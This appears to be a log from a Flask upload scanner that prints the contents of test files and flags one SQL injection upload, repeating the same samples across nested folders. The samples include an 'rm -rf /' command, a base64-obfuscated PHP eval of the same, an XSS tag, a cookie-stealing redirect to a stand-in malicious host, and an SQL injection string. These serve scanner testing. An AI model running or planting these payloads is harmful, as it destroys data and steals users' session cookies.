plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:49:14,355 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,356 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:49:14,357 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,358 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,359 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,360 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:49:14,366 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,367 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:49:14,368 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:49:14,370 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:49:14,372 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:49:14,374 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:49:14,376 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,377 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:49:14,379 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,380 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,381 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,382 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:49:14,388 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,389 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:49:14,390 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:49:14,392 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:49:14,394 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:49:14,396 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:49:14,397 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,398 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:49:14,399 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,401 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,402 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,403 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:49:14,408 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,409 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:49:14,410 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,411 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,413 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,414 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,415 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,417 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:49:14,419 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,420 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:49:14,421 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,423 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,424 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,425 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,427 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,428 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,429 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:49:14,430 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,431 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:49:14,433 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,434 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,435 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,436 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,437 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,438 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,440 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:49:14,441 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,443 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:49:14,444 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,445 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,446 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,447 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,448 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,450 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,451 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:49:14,452 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,453 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:49:14,455 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,456 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,457 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,458 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,460 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,461 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,462 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:49:14,463 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,465 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:49:14,466 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,470 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:49:14,470 - [33mPress CTRL+C to quit[0m
2025-02-22 20:49:17,395 - 127.0.0.1 - - [22/Feb/2025 20:49:17] "GET / HTTP/1.1" 200 -
2025-02-22 20:49:21,719 - Extracted content from uploads/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:49:21,719 - Malicious pattern detected in uploads/1/1.sql
2025-02-22 20:49:21,720 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:49:21,724 - 127.0.0.1 - - [22/Feb/2025 20:49:21] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:49:21,731 - 127.0.0.1 - - [22/Feb/2025 20:49:21] "GET / HTTP/1.1" 200 -
2025-02-22 20:50:14,027 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:50:14,033 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:50:14,034 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:50:14,036 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:50:14,038 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,039 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:50:14,040 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,041 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:50:14,042 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,043 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:50:14,049 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,050 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:50:14,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:50:14,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:50:14,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:50:14,057 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:50:14,059 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,060 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:50:14,061 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,062 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:50:14,063 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,064 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
